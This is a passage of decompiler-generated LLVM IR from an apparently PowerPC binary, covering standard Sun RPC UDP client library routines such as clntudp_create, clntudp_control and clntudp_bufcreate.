  %v3_100221a4 = load i32, i32* %stack_var_-116, align 4
  store i32 %v3_100221a4, i32* %r0.global-to-local, align 4
  %v3_100221a8 = icmp eq i32 %v3_100221a4, -1
  br i1 %v3_100221a8, label %dec_label_pc_100221b0, label %dec_label_pc_100222ec

dec_label_pc_100221b0:                            ; preds = %dec_label_pc_100221a4
  %v0_100221b0 = call i32 @__errno_location()
  store i32 %v0_100221b0, i32* %r3.global-to-local, align 4
  %v0_100221b4 = load i32, i32* @r29, align 4
  %v1_100221b4 = add i32 %v0_100221b4, 30
  store i32 %v1_100221b4, i32* %r0.global-to-local, align 4
  %v1_100221b8 = call i32 @__asm_rlwinm(i32 %v1_100221b4, i32 0, i32 0, i32 27)
  store i32 %v1_100221b8, i32* %r0.global-to-local, align 4
  %v1_100221c0 = inttoptr i32 %v0_100221b0 to i32*
  %v2_100221c0 = load i32, i32* %v1_100221c0, align 4
  store i32 %v2_100221c0, i32* %r0.global-to-local, align 4
  %v3_100221c4 = icmp eq i32 %v2_100221c0, 34
  br i1 %v3_100221c4, label %dec_label_pc_100221cc, label %dec_label_pc_100222ec

dec_label_pc_100221cc:                            ; preds = %dec_label_pc_100221b0
  %v2_100221cc = load i32, i32* %stack_var_-1168, align 4
  store i32 %v2_100221cc, i32* %r0.global-to-local, align 4
  %v1_100221d0 = load i32, i32* @r1, align 4
  %v3_100221d0 = sub i32 %v1_100221d0, %v1_100221b8
  %v4_100221d0 = inttoptr i32 %v3_100221d0 to i32*
  store i32 %v2_100221cc, i32* %v4_100221d0, align 4
  br label %dec_label_pc_100221d4

dec_label_pc_100221d4:                            ; preds = %dec_label_pc_10022194, %dec_label_pc_100221cc
  store i32 %v2_100221d4, i32* %r0.global-to-local, align 4
  %v1_100221dc = call i32 @__asm_rlwinm(i32 %v2_100221d4, i32 0, i32 0, i32 27)
  %v0_100221ec = load i32, i32* @r21, align 4
  store i32 %v0_100221ec, i32* %r3.global-to-local, align 4
  %v0_100221f0 = load i32, i32* @r29, align 4
  %v1_100221f0 = mul i32 %v0_100221f0, 2
  store i32 %v1_100221f0, i32* %r29.global-to-local, align 4
  store i32 268575224, i32* @lr, align 4
  %v7_100221f4 = call i32 @gethostbyname_r(i32 %v0_100221ec, i32* nonnull %stack_var_-96, i32 %v1_100221dc, i32 %v2_100221e4, i32 %v2_100221e8, i32 %v2_100221e8)
  store i32 %v7_100221f4, i32* %r3.global-to-local, align 4
  %sext = mul i32 %v7_100221f4, 65536
  %sext.off = or i32 %sext, 65535
  %tmp = icmp ult i32 %sext.off, 131071
  br i1 %tmp, label %dec_label_pc_10022200, label %dec_label_pc_100221a4

dec_label_pc_10022200:                            ; preds = %dec_label_pc_100221d4
  %v3_10022200 = load i32, i32* %stack_var_-120, align 4
  %v3_10022204 = icmp eq i32 %v3_10022200, 0
  br i1 %v3_10022204, label %dec_label_pc_100221a4, label %dec_label_pc_1002220c

dec_label_pc_1002220c:                            ; preds = %dec_label_pc_10022200
  %v1_1002220c = add i32 %v3_10022200, 16
  %v2_1002220c = inttoptr i32 %v1_1002220c to i32*
  %v3_1002220c = load i32, i32* %v2_1002220c, align 4
  %v2_10022210 = ptrtoint i32* %stack_var_-108 to i32
  store i32 %v2_10022210, i32* @r3, align 4
  %v1_10022214 = add i32 %v3_10022200, 12
  %v2_10022214 = inttoptr i32 %v1_10022214 to i32*
  %v3_10022214 = load i32, i32* %v2_10022214, align 4
  store i32 %v3_10022214, i32* @r5, align 4
  store i32 5, i32* %r27.global-to-local, align 4
  %v1_10022220 = inttoptr i32 %v3_1002220c to i32*
  %v2_10022220 = load i32, i32* %v1_10022220, align 4
  store i32 %v2_10022220, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_10022228.1293 to i32), i32* @lr, align 4
  %v0_10022224 = call i32 @memcpy()
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_1002222c = ptrtoint i32* %stack_var_-112 to i32
  store i32 %v2_1002222c, i32* %r3.global-to-local, align 4
  %v0_10022230 = load i32, i32* @r23, align 4
  %v0_10022234 = load i32, i32* @r22, align 4
  %v2_10022238 = ptrtoint i32* %stack_var_-72 to i32
  %v0_1002223c = load i32, i32* @r30, align 4
  %v1_1002223c = add i32 %v0_1002223c, 4
  store i32 %v1_1002223c, i32* @r7, align 4
  store i32 2, i32* %stack_var_-112, align 4
  %v0_10022248 = load i32, i32* %r27.global-to-local, align 4
  store i32 %v0_10022248, i32* %stack_var_-72, align 4
  store i32 268575316, i32* @lr, align 4
  %v6_10022250 = call i32 @__GI_clntudp_create(i32* nonnull %stack_var_-112, i32 %v0_10022230, i32 %v0_10022234, i32 %v2_10022238, i32 %v1_1002223c)
  store i32 %v6_10022250, i32* %r3.global-to-local, align 4
  %v3_10022254 = icmp eq i32 %v6_10022250, 0
  %v1_10022258 = load i32, i32* @r30, align 4
  %v2_10022258 = inttoptr i32 %v1_10022258 to i32*
  store i32 %v6_10022250, i32* %v2_10022258, align 4
  br i1 %v3_10022254, label %dec_label_pc_10022260, label %dec_label_pc_1002226c

dec_label_pc_10022260:                            ; preds = %dec_label_pc_1002220c
  store i32 268575332, i32* @lr, align 4
  %v0_10022260 = call i32 @__GI___rpc_thread_createerr()
  store i32 %v0_10022260, i32* %r3.global-to-local, align 4
  %v1_10022264 = inttoptr i32 %v0_10022260 to i32*
  %v2_10022264 = load i32, i32* %v1_10022264, align 4
  store i32 %v2_10022264, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100222f0

dec_label_pc_1002226c:                            ; preds = %dec_label_pc_1002220c
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_10022270 = load i32, i32* @r23, align 4
  %v1_10022270 = load i32, i32* @r30, align 4
  %v2_10022270 = add i32 %v1_10022270, 8
  %v3_10022270 = inttoptr i32 %v2_10022270 to i32*
  store i32 %v0_10022270, i32* %v3_10022270, align 4
  %v0_10022274 = load i32, i32* %r0.global-to-local, align 4
  %v1_10022274 = load i32, i32* @r30, align 4
  %v2_10022274 = add i32 %v1_10022274, 16
  %v3_10022274 = inttoptr i32 %v2_10022274 to i32*
  store i32 %v0_10022274, i32* %v3_10022274, align 4
  %v0_10022278 = load i32, i32* @r21, align 4
  store i32 %v0_10022278, i32* @r4, align 4
  %v0_1002227c = load i32, i32* @r22, align 4
  %v1_1002227c = load i32, i32* @r30, align 4
  %v2_1002227c = add i32 %v1_1002227c, 12
  %v3_1002227c = inttoptr i32 %v2_1002227c to i32*
  store i32 %v0_1002227c, i32* %v3_1002227c, align 4
  %v0_10022284 = load i32, i32* @r30, align 4
  %v1_10022284 = add i32 %v0_10022284, 20
  %v2_10022284 = inttoptr i32 %v1_10022284 to i32*
  %v3_10022284 = load i32, i32* %v2_10022284, align 4
  store i32 %v3_10022284, i32* %r3.global-to-local, align 4
  store i32 268575372, i32* @lr, align 4
  %v3_10022288 = call i32 @strncpy(i32 %v3_10022284, i32 %v0_10022278, i32 255)
  store i32 %v3_10022288, i32* %r3.global-to-local, align 4
  %v0_1002228c = load i32, i32* @r30, align 4
  %v1_1002228c = add i32 %v0_1002228c, 20
  %v2_1002228c = inttoptr i32 %v1_1002228c to i32*
  %v3_1002228c = load i32, i32* %v2_1002228c, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_10022294 = add i32 %v3_1002228c, 255
  %v4_10022294 = inttoptr i32 %v3_10022294 to i8*
  store i8 0, i8* %v4_10022294, align 1
  br label %dec_label_pc_10022298

dec_label_pc_10022298:                            ; preds = %dec_label_pc_10022140.dec_label_pc_10022298_crit_edge, %dec_label_pc_1002226c
  %v0_100222a0 = load i32, i32* @r30, align 4
  %v1_100222a0 = inttoptr i32 %v0_100222a0 to i32*
  %v2_100222a0 = load i32, i32* %v1_100222a0, align 4
  store i32 25, i32* %stack_var_-72, align 4
  store i32 %v2_100222a0, i32* %r3.global-to-local, align 4
  %v1_100222c4 = add i32 %v2_100222a0, 4
  %v2_100222c4 = inttoptr i32 %v1_100222c4 to i32*
  %v3_100222c4 = load i32, i32* %v2_100222c4, align 4
  %v1_100222c8 = inttoptr i32 %v3_100222c4 to i32*
  %v2_100222c8 = load i32, i32* %v1_100222c8, align 4
  call void @__pseudo_call(i32 %v2_100222c8)
  %v0_100222d8 = load i32, i32* %r3.global-to-local, align 4
  %v3_100222d8 = icmp eq i32 %v0_100222d8, 0
  br i1 %v3_100222d8, label %dec_label_pc_100222f0, label %dec_label_pc_100222e0

dec_label_pc_100222e0:                            ; preds = %dec_label_pc_10022298
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_100222e4 = load i32, i32* @r30, align 4
  %v2_100222e4 = add i32 %v1_100222e4, 16
  %v3_100222e4 = inttoptr i32 %v2_100222e4 to i32*
  store i32 0, i32* %v3_100222e4, align 4
  %v0_10022304.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100222f0

dec_label_pc_100222ec:                            ; preds = %dec_label_pc_100221b0, %dec_label_pc_100221a4
  store i32 13, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100222f0

dec_label_pc_100222f0:                            ; preds = %dec_label_pc_10022298, %dec_label_pc_100220dc, %dec_label_pc_100222e0, %dec_label_pc_10022260, %dec_label_pc_100222ec
  %v0_10022304 = phi i32 [ 0, %dec_label_pc_10022298 ], [ 0, %dec_label_pc_100220dc ], [ %v0_10022304.pre, %dec_label_pc_100222e0 ], [ %v2_10022264, %dec_label_pc_10022260 ], [ 13, %dec_label_pc_100222ec ]
  %v2_100222f0 = load i32, i32* %stack_var_-128, align 4
  %v1_100222f4 = add i32 %v2_100222f0, 4
  %v2_100222f4 = inttoptr i32 %v1_100222f4 to i32*
  %v3_100222f4 = load i32, i32* %v2_100222f4, align 4
  store i32 %v3_100222f4, i32* %r0.global-to-local, align 4
  ret i32 %v0_10022304

; uselistorder directives
  uselistorder i32 %v2_100222a0, { 1, 0 }
  uselistorder i32 %v2_100221e8, { 1, 0 }
  uselistorder i32 %v3_10022154, { 1, 0, 2 }
  uselistorder i32 %v0_10022154, { 1, 0 }
  uselistorder i32 %v0_10022108, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 1, 3, 2, 4, 5, 6, 7, 8, 9, 10, 12, 13, 11, 14, 15, 16, 17, 18, 19, 20, 21, 22, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 12, 6, 7, 8, 9, 10, 11, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder i32 13, { 0, 4, 8, 3, 2, 5, 6, 7, 1 }
  uselistorder i32 65535, { 0, 6, 5, 12, 7, 8, 1, 2, 9, 10, 3, 4, 11 }
  uselistorder i32 164, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_100222f0, { 4, 2, 0, 3, 1 }
  uselistorder label %dec_label_pc_10022298, { 1, 0 }
  uselistorder label %dec_label_pc_100221d4, { 1, 0 }
  uselistorder label %dec_label_pc_100221a4, { 1, 0 }
  uselistorder label %dec_label_pc_10022194, { 1, 0 }
  uselistorder label %dec_label_pc_10022174, { 1, 0 }
  uselistorder label %dec_label_pc_1002211c, { 1, 0 }
  uselistorder label %dec_label_pc_100220f8, { 1, 0 }
}

define i32 @clntudp_geterr(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 %arg1
}

define i32 @clntudp_freeres(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v1_10022334 = add i32 %arg1, 8
  %v2_10022334 = inttoptr i32 %v1_10022334 to i32*
  %v3_10022334 = load i32, i32* %v2_10022334, align 4
  store i32 %v3_10022334, i32* %r3.global-to-local, align 4
  %v2_10022338 = add i32 %v3_10022334, 56
  %v3_10022338 = inttoptr i32 %v2_10022338 to i32*
  store i32 2, i32* %v3_10022338, align 4
  %v0_1002233c = load i32, i32* %r3.global-to-local, align 4
  %v1_1002233c = add i32 %v0_1002233c, 56
  store i32 %v1_1002233c, i32* %r3.global-to-local, align 4
  call void @__pseudo_call(i32 %arg2)
  ret i32 %v1_1002233c

; uselistorder directives
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 0 }
}

define i32 @clntudp_abort() local_unnamed_addr {
entry:
  %v0_10022358 = load i32, i32* @r3, align 4
  ret i32 %v0_10022358
}

define i32 @clntudp_control(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v1_1002235c = add i32 %arg2, -1
  %v2_10022364 = icmp ugt i32 %v1_1002235c, 14
  br i1 %v2_10022364, label %dec_label_pc_1002238c, label %dec_label_pc_10022370

dec_label_pc_10022370:                            ; preds = %entry
  %v1_10022374 = mul i32 %v1_1002235c, 4
  %v2_1002237c = add i32 %v1_10022374, ptrtoint (i32* @global_var_1002f9d8.1294 to i32)
  %v3_1002237c = inttoptr i32 %v2_1002237c to i32*
  %v4_1002237c = load i32, i32* %v3_1002237c, align 4
  %v2_10022380 = add i32 %v4_1002237c, ptrtoint (i32* @global_var_1002f9d8.1294 to i32)
  call void @__pseudo_branch(i32 %v2_10022380)
  br label %dec_label_pc_1002238c

dec_label_pc_1002238c:                            ; preds = %entry, %dec_label_pc_10022370
  ret i32 0

; uselistorder directives
  uselistorder label %dec_label_pc_1002238c, { 1, 0 }
}

define i32 @function_10022394() local_unnamed_addr {
dec_label_pc_10022394:
  %v1_100223a8 = load i32, i32* @r10, align 4
  %v2_100223a8 = add i32 %v1_100223a8, 4
  %v3_100223a8 = inttoptr i32 %v2_100223a8 to i32*
  store i32 1, i32* %v3_100223a8, align 4
  ret i32 1
}

define i32 @function_100223b0(i32* %arg1) local_unnamed_addr {
dec_label_pc_100223b0:
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v1_100223b0 = add i32 %tmp, 4
  %v2_100223b0 = inttoptr i32 %v1_100223b0 to i32*
  %v3_100223b0 = load i32, i32* %v2_100223b0, align 4
  %v2_100223b8 = load i32, i32* %arg1, align 4
  store i32 %v2_100223b8, i32* %r9.global-to-local, align 4
  %v1_100223bc = load i32, i32* @r10, align 4
  %v2_100223bc = add i32 %v1_100223bc, 40
  %v3_100223bc = inttoptr i32 %v2_100223bc to i32*
  store i32 %v3_100223b0, i32* %v3_100223bc, align 4
  %v0_100223c0 = load i32, i32* %r9.global-to-local, align 4
  %v1_100223c0 = load i32, i32* @r10, align 4
  %v2_100223c0 = add i32 %v1_100223c0, 36
  %v3_100223c0 = inttoptr i32 %v2_100223c0 to i32*
  store i32 %v0_100223c0, i32* %v3_100223c0, align 4
  ret i32 1
}

define i32 @function_100223c8(i32 %arg1) local_unnamed_addr {
dec_label_pc_100223c8:
  %r9.global-to-local = alloca i32, align 4
  %v0_100223c8 = load i32, i32* @r10, align 4
  %v1_100223c8 = add i32 %v0_100223c8, 40
  %v2_100223c8 = inttoptr i32 %v1_100223c8 to i32*
  %v3_100223c8 = load i32, i32* %v2_100223c8, align 4
  %v1_100223cc = add i32 %v0_100223c8, 36
  %v2_100223cc = inttoptr i32 %v1_100223cc to i32*
  %v3_100223cc = load i32, i32* %v2_100223cc, align 4
  store i32 %v3_100223cc, i32* %r9.global-to-local, align 4
  %v1_100223f8 = load i32, i32* @r12, align 4
  %v2_100223f8 = add i32 %v1_100223f8, 4
  %v3_100223f8 = inttoptr i32 %v2_100223f8 to i32*
  store i32 %v3_100223c8, i32* %v3_100223f8, align 4
  %v0_100223fc = load i32, i32* %r9.global-to-local, align 4
  %v1_100223fc = load i32, i32* @r12, align 4
  %v2_100223fc = inttoptr i32 %v1_100223fc to i32*
  store i32 %v0_100223fc, i32* %v2_100223fc, align 4
  ret i32 1
}

define i32 @function_10022404() local_unnamed_addr {
dec_label_pc_10022404:
  ret i32 1
}

define i32 @function_10022418(i32 %arg1) local_unnamed_addr {
dec_label_pc_10022418:
  %v0_10022418 = load i32, i32* @r10, align 4
  %v1_10022418 = inttoptr i32 %v0_10022418 to i32*
  %v2_10022418 = load i32, i32* %v1_10022418, align 4
  %v1_10022474 = load i32, i32* @r12, align 4
  %v2_10022474 = inttoptr i32 %v1_10022474 to i32*
  store i32 %v2_10022418, i32* %v2_10022474, align 4
  ret i32 1
}

define i32 @function_1002247c(i32* %arg1) local_unnamed_addr {
dec_label_pc_1002247c:
  %v0_1002247c = load i32, i32* @r10, align 4
  %v1_1002247c = add i32 %v0_1002247c, 88
  %v2_1002247c = inttoptr i32 %v1_1002247c to i32*
  %v3_1002247c = load i32, i32* %v2_1002247c, align 4
  %v2_10022484 = load i32, i32* %arg1, align 4
  %v2_10022488 = add i32 %v3_1002247c, 12
  %v3_10022488 = inttoptr i32 %v2_10022488 to i32*
  store i32 %v2_10022484, i32* %v3_10022488, align 4
  ret i32 1
}

define i32 @__GI_clntudp_bufcreate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r24.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-100 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %v0_10022494 = load i32, i32* @lr, align 4
  store i32 %v0_10022494, i32* %r0.global-to-local, align 4
  %v0_1002249c = load i32, i32* @r8, align 4
  %v0_100224a4 = load i32, i32* @r9, align 4
  store i32 %v0_100224a4, i32* @r29, align 4
  store i32 %arg1, i32* @r30, align 4
  %v1_100224ac = add i32 %v0_1002249c, 3
  store i32 12, i32* @r3, align 4
  store i32 %arg2, i32* @r23, align 4
  store i32 %arg3, i32* @r22, align 4
  %v0_100224bc = load i32, i32* @r6, align 4
  %v1_100224bc = inttoptr i32 %v0_100224bc to i32*
  %v2_100224bc = load i32, i32* %v1_100224bc, align 4
  store i32 %v2_100224bc, i32* %r25.global-to-local, align 4
  %v1_100224c0 = add i32 %v0_100224bc, 4
  %v2_100224c0 = inttoptr i32 %v1_100224c0 to i32*
  %v3_100224c0 = load i32, i32* %v2_100224c0, align 4
  store i32 %v3_100224c0, i32* @r26, align 4
  %v0_100224c4 = load i32, i32* @r7, align 4
  store i32 %v0_100224c4, i32* %r24.global-to-local, align 4
  %v1_100224c8 = call i32 @__asm_rlwinm(i32 %v1_100224ac, i32 0, i32 0, i32 29)
  store i32 268575952, i32* @lr, align 4
  %v0_100224cc = call i32 @malloc()
  store i32 %v0_100224cc, i32* %r3.global-to-local, align 4
  %v0_100224d0 = load i32, i32* @r29, align 4
  %v1_100224d0 = add i32 %v0_100224d0, 3
  store i32 %v0_100224cc, i32* @r27, align 4
  %v1_100224d8 = call i32 @__asm_rlwinm(i32 %v1_100224d0, i32 0, i32 0, i32 29)
  %v1_100224dc = add i32 %v1_100224c8, 100
  %v2_100224e0 = add i32 %v1_100224dc, %v1_100224d8
  store i32 %v2_100224e0, i32* @r3, align 4
  store i32 268575976, i32* @lr, align 4
  %v0_100224e4 = call i32 @malloc()
  store i32 %v0_100224e4, i32* %r3.global-to-local, align 4
  %v0_100224e8 = load i32, i32* @r27, align 4
  %v3_100224e8 = icmp eq i32 %v0_100224e8, 0
  store i32 %v0_100224e4, i32* @r31, align 4
  br i1 %v3_100224e8, label %dec_label_pc_100224fc, label %dec_label_pc_100224f4

dec_label_pc_100224f4:                            ; preds = %entry
  %v3_100224f4 = icmp eq i32 %v0_100224e4, 0
  br i1 %v3_100224f4, label %dec_label_pc_100224fc, label %dec_label_pc_10022528

dec_label_pc_100224fc:                            ; preds = %dec_label_pc_100224f4, %entry
  store i32 268576000, i32* @lr, align 4
  %v0_100224fc = call i32 @__GI___rpc_thread_createerr()
  %v3_10022504 = load i32, i32* @global_var_1004511c, align 4
  store i32 %v0_100224fc, i32* @r29, align 4
  store i32 ptrtoint ([31 x i8]* @global_var_1002fa14.1295 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10022518.1296 to i32), i32* @lr, align 4
  %v4_10022514 = call i32 @__GI_fputs(i32 ptrtoint ([31 x i8]* @global_var_1002fa14.1295 to i32), i32 %v3_10022504, i32 268697600)
  store i32 %v4_10022514, i32* %r3.global-to-local, align 4
  store i32 12, i32* %r0.global-to-local, align 4
  %v1_1002251c = load i32, i32* @r29, align 4
  %v2_1002251c = add i32 %v1_1002251c, 8
  %v3_1002251c = inttoptr i32 %v2_1002251c to i32*
  store i32 12, i32* %v3_1002251c, align 4
  %v0_10022520 = load i32, i32* %r0.global-to-local, align 4
  %v1_10022520 = load i32, i32* @r29, align 4
  %v2_10022520 = inttoptr i32 %v1_10022520 to i32*
  store i32 %v0_10022520, i32* %v2_10022520, align 4
  br label %dec_label_pc_100226a8

dec_label_pc_10022528:                            ; preds = %dec_label_pc_100224f4
  %v0_10022528 = load i32, i32* @r30, align 4
  %v1_10022528 = add i32 %v0_10022528, 2
  %v2_10022528 = inttoptr i32 %v1_10022528 to i16*
  %v3_10022528 = load i16, i16* %v2_10022528, align 2
  %v4_10022528 = zext i16 %v3_10022528 to i32
  store i32 %v4_10022528, i32* %r0.global-to-local, align 4
  %v1_1002252c = add i32 %v1_100224d8, 96
  %v2_10022530 = add i32 %v1_1002252c, %v0_100224e4
  %v2_10022534 = add i32 %v0_100224e4, 88
  %v3_10022534 = inttoptr i32 %v2_10022534 to i32*
  store i32 %v2_10022530, i32* %v3_10022534, align 4
  %v0_10022538 = load i32, i32* %r0.global-to-local, align 4
  %v3_10022538 = icmp eq i32 %v0_10022538, 0
  br i1 %v3_10022538, label %dec_label_pc_10022540, label %dec_label_pc_10022560

dec_label_pc_10022540:                            ; preds = %dec_label_pc_10022528
  %v0_10022540 = load i32, i32* @r30, align 4
  store i32 %v0_10022540, i32* %r3.global-to-local, align 4
  %v0_10022544 = load i32, i32* @r23, align 4
  %v0_10022548 = load i32, i32* @r22, align 4
  store i32 268576084, i32* @lr, align 4
  %v5_10022550 = call i32 @pmap_getport(i32 %v0_10022540, i32 %v0_10022544, i32 %v0_10022548, i32 17, i32 %v2_10022530)
  %v6_10022550 = trunc i32 %v5_10022550 to i16
  store i32 %v5_10022550, i32* %r3.global-to-local, align 4
  %v4_10022554 = icmp eq i16 %v6_10022550, 0
  br i1 %v4_10022554, label %dec_label_pc_100226a8, label %dec_label_pc_1002255c

dec_label_pc_1002255c:                            ; preds = %dec_label_pc_10022540
  %v3_1002255c = load i32, i32* @r30, align 4
  %v4_1002255c = add i32 %v3_1002255c, 2
  %v5_1002255c = inttoptr i32 %v4_1002255c to i16*
  store i16 %v6_10022550, i16* %v5_1002255c, align 2
  br label %dec_label_pc_10022560

dec_label_pc_10022560:                            ; preds = %dec_label_pc_10022528, %dec_label_pc_1002255c
  %v0_10022564 = load i32, i32* @r31, align 4
  %v1_10022564 = load i32, i32* @r27, align 4
  %v2_10022564 = add i32 %v1_10022564, 8
  %v3_10022564 = inttoptr i32 %v2_10022564 to i32*
  store i32 %v0_10022564, i32* %v3_10022564, align 4
  store i32 -1, i32* %r11.global-to-local, align 4
  %v1_10022570 = load i32, i32* @r27, align 4
  %v2_10022570 = add i32 %v1_10022570, 4
  %v3_10022570 = inttoptr i32 %v2_10022570 to i32*
  store i32 ptrtoint (i32* @global_var_10045034.1297 to i32), i32* %v3_10022570, align 4
  %v0_10022574 = load i32, i32* @r31, align 4
  %v1_10022574 = add i32 %v0_10022574, 8
  store i32 16, i32* %r0.global-to-local, align 4
  %v0_10022588 = load i32, i32* %r11.global-to-local, align 4
  %v2_10022588 = add i32 %v0_10022574, 40
  %v3_10022588 = inttoptr i32 %v2_10022588 to i32*
  store i32 %v0_10022588, i32* %v3_10022588, align 4
  %v0_1002258c = load i32, i32* %r11.global-to-local, align 4
  %v1_1002258c = load i32, i32* @r31, align 4
  %v2_1002258c = add i32 %v1_1002258c, 36
  %v3_1002258c = inttoptr i32 %v2_1002258c to i32*
  store i32 %v0_1002258c, i32* %v3_1002258c, align 4
  %v0_10022590 = load i32, i32* %r0.global-to-local, align 4
  %v1_10022590 = load i32, i32* @r31, align 4
  %v2_10022590 = add i32 %v1_10022590, 24
  %v3_10022590 = inttoptr i32 %v2_10022590 to i32*
  store i32 %v0_10022590, i32* %v3_10022590, align 4
  %v1_10022594 = load i32, i32* @r31, align 4
  %v2_10022594 = add i32 %v1_10022594, 92
  %v3_10022594 = inttoptr i32 %v2_10022594 to i32*
  store i32 %v1_100224d8, i32* %v3_10022594, align 4
  %v0_10022598 = load i32, i32* @r31, align 4
  %v0_1002259c = load i32, i32* %r25.global-to-local, align 4
  %v2_1002259c = add i32 %v0_10022598, 28
  %v3_1002259c = inttoptr i32 %v2_1002259c to i32*
  store i32 %v0_1002259c, i32* %v3_1002259c, align 4
  %v0_100225a0 = load i32, i32* @r26, align 4
  %v1_100225a0 = load i32, i32* @r31, align 4
  %v2_100225a0 = add i32 %v1_100225a0, 32
  %v3_100225a0 = inttoptr i32 %v2_100225a0 to i32*
  store i32 %v0_100225a0, i32* %v3_100225a0, align 4
  %v1_100225a4 = load i32, i32* @r31, align 4
  %v2_100225a4 = add i32 %v1_100225a4, 84
  %v3_100225a4 = inttoptr i32 %v2_100225a4 to i32*
  store i32 %v1_100224c8, i32* %v3_100225a4, align 4
  store i32 268576172, i32* @lr, align 4
  %v1_100225a8 = call i32 @_create_xid(i32 %v1_10022574)
  store i32 %v1_100225a8, i32* %r3.global-to-local, align 4
  %v0_100225ac = load i32, i32* @r31, align 4
  %v1_100225ac = add i32 %v0_100225ac, 88
  %v2_100225ac = inttoptr i32 %v1_100225ac to i32*
  %v3_100225ac = load i32, i32* %v2_100225ac, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 %v1_100225a8, i32* %stack_var_-96, align 4
  %v0_100225c0 = load i32, i32* @r29, align 4
  store i32 %v0_100225c0, i32* %r3.global-to-local, align 4
  %v4_100225d4 = inttoptr i32 %v0_100225c0 to i32*
  %v5_100225d4 = call i32 @__GI_xdrmem_create(i32* %v4_100225d4, i32 %v3_100225ac, i32 %v1_100224c8, i32 0)
  %v0_100225d8 = load i32, i32* @r29, align 4
  store i32 %v0_100225d8, i32* %r3.global-to-local, align 4
  %v2_100225dc = ptrtoint i32* %stack_var_-96 to i32
  store i32 268576228, i32* @lr, align 4
  %v2_100225e0 = inttoptr i32 %v0_100225d8 to i32*
  %v3_100225e0 = call i32 @__GI_xdr_callhdr(i32* %v2_100225e0, i32 %v2_100225dc)
  store i32 %v3_100225e0, i32* %r3.global-to-local, align 4
  %v3_100225e4 = icmp eq i32 %v3_100225e0, 0
  br i1 %v3_100225e4, label %dec_label_pc_100226a8, label %dec_label_pc_100225ec

dec_label_pc_100225ec:                            ; preds = %dec_label_pc_10022560
  %v0_100225ec = load i32, i32* @r31, align 4
  %v1_100225ec = add i32 %v0_100225ec, 60
  %v2_100225ec = inttoptr i32 %v1_100225ec to i32*
  %v3_100225ec = load i32, i32* %v2_100225ec, align 4
  %v0_100225f0 = load i32, i32* @r29, align 4
  store i32 %v0_100225f0, i32* %r3.global-to-local, align 4
  %v1_100225f4 = add i32 %v3_100225ec, 16
  %v2_100225f4 = inttoptr i32 %v1_100225f4 to i32*
  %v3_100225f4 = load i32, i32* %v2_100225f4, align 4
  call void @__pseudo_call(i32 %v3_100225f4)
  %v0_10022600 = load i32, i32* %r24.global-to-local, align 4
  %v1_10022600 = inttoptr i32 %v0_10022600 to i32*
  %v2_10022600 = load i32, i32* %v1_10022600, align 4
  store i32 %v2_10022600, i32* %r0.global-to-local, align 4
  %v0_10022604 = load i32, i32* %r3.global-to-local, align 4
  %v1_10022604 = load i32, i32* @r31, align 4
  %v2_10022604 = add i32 %v1_10022604, 80
  %v3_10022604 = inttoptr i32 %v2_10022604 to i32*
  store i32 %v0_10022604, i32* %v3_10022604, align 4
  %v0_10022608 = load i32, i32* %r0.global-to-local, align 4
  %tmp10 = icmp sgt i32 %v0_10022608, -1
  br i1 %tmp10, label %dec_label_pc_10022690, label %dec_label_pc_10022610

dec_label_pc_10022610:                            ; preds = %dec_label_pc_100225ec
  store i32 1, i32* @r30, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 1, i32* %stack_var_-104, align 4
  store i32 268576296, i32* @lr, align 4
  %v3_10022624 = call i32 @socket(i32 2, i32 2, i32 17)
  store i32 %v3_10022624, i32* %r3.global-to-local, align 4
  %v1_1002262c = load i32, i32* %r24.global-to-local, align 4
  %v2_1002262c = inttoptr i32 %v1_1002262c to i32*
  store i32 %v3_10022624, i32* %v2_1002262c, align 4
  %tmp11 = icmp sgt i32 %v3_10022624, -1
  br i1 %tmp11, label %dec_label_pc_10022654, label %dec_label_pc_10022634

dec_label_pc_10022634:                            ; preds = %dec_label_pc_10022610
  store i32 ptrtoint (i32* @global_var_10022638.1298 to i32), i32* @lr, align 4
  %v0_10022634 = call i32 @__GI___rpc_thread_createerr()
  store i32 %v0_10022634, i32* %r3.global-to-local, align 4
  store i32 12, i32* %r0.global-to-local, align 4
  %v2_1002263c = inttoptr i32 %v0_10022634 to i32*
  store i32 12, i32* %v2_1002263c, align 4
  %v0_10022644 = call i32 @__errno_location()
  store i32 %v0_10022644, i32* %r3.global-to-local, align 4
  %v1_10022648 = inttoptr i32 %v0_10022644 to i32*
  %v2_10022648 = load i32, i32* %v1_10022648, align 4
  store i32 %v2_10022648, i32* %r0.global-to-local, align 4
  %v2_1002264c = add i32 %v0_10022634, 8
  %v3_1002264c = inttoptr i32 %v2_1002264c to i32*
  store i32 %v2_10022648, i32* %v3_1002264c, align 4
  br label %dec_label_pc_100226a8

dec_label_pc_10022654:                            ; preds = %dec_label_pc_10022610
  store i32 268576348, i32* @lr, align 4
